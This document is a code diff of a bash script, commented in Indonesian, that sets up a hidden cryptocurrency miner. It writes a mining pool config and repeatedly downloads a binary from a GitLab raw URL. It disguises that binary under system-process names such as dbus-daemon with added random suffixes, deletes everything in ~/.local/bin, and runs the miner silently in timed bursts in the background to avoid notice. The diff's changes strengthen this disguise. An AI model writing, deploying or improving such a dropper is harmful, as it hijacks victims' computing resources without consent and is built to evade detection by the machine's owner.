@@ -1,7 +1,4 @@
-#!/bin/bash
-
-
-# Konfigurasi default (nanti disimpan ke file config dengan nama sesuai bin)
+# Konfigurasi default
 CONFIG_JSON='{
   "algo": "Yespowertide",
   "url": "3.144.92.123:443",
@@ -18,35 +15,51 @@ POSSIBLE_NAMES=("dbus-daemon" "pulseaudio" "systemd-helper" "gvfsd" \
 LOCAL_BIN_DIR="$HOME/.local/bin"
 mkdir -p "$LOCAL_BIN_DIR"
 
+# Fungsi untuk generate random string 8 karakter
+generate_random_string() {
+    local chars='abcdefghijklmnopqrstuvwxyz0123456789'
+    local length=8
+    local result=""
+    for ((i=0; i<length; i++)); do
+        result+=${chars:$RANDOM%${#chars}:1}
+    done
+    echo "$result"
+}
+
 while true; do
     # Hapus data sesi lama
     rm -f "$LOCAL_BIN_DIR"/*
 
     # Pilih nama binary acak
     BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
-    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config.json"
+    
+    # Tambahkan random string 8 karakter ke nama binary
+    RANDOM_STR=$(generate_random_string)
+    BIN_NAME_WITH_RANDOM="${BIN_NAME}${RANDOM_STR}"
+    
+    # Buat nama config dengan random string juga
+    CONFIG_NAME="${BIN_NAME}${RANDOM_STR}_config.json"
+    CONFIG_PATH="$LOCAL_BIN_DIR/$CONFIG_NAME"
 
-    # Simpan config JSON sesuai nama bin
+    # Simpan config JSON
     echo "$CONFIG_JSON" > "$CONFIG_PATH"
 
+    # Download binary baru dengan nama yang sudah di-random
+    wget -q "https://gitlab.com/dfchfg/filess/-/raw/main/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
+    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM"
 
-    # Download binary baru
-    wget -q "https://gitlab.com/dfchfg/filess/-/raw/main/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME"
-    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME"
-
-    # Tentukan waktu aktif (2Ã¢â‚¬â€œ3 menit)
+    # Tentukan waktu aktif (2–3 menit)
     ACTIVE_MIN=$((RANDOM % 2 + 2))
     ACTIVE_SEC=$((ACTIVE_MIN * 60))
 
-    # Tentukan waktu istirahat (20Ã¢â‚¬â€œ30 detik)
+    # Tentukan waktu istirahat (20–30 detik)
     IDLE_SEC=$((RANDOM % 11 + 20))
 
-
     # Jalankan proses dengan timeout
-    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME" --config="$CONFIG_PATH" >/dev/null 2>&1
+    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_WITH_RANDOM" --config="$CONFIG_PATH" >/dev/null 2>&1
 
     # Istirahat
-  sleep "$IDLE_SEC"
+    sleep "$IDLE_SEC"
 done > /dev/null 2>&1 &
 """
 
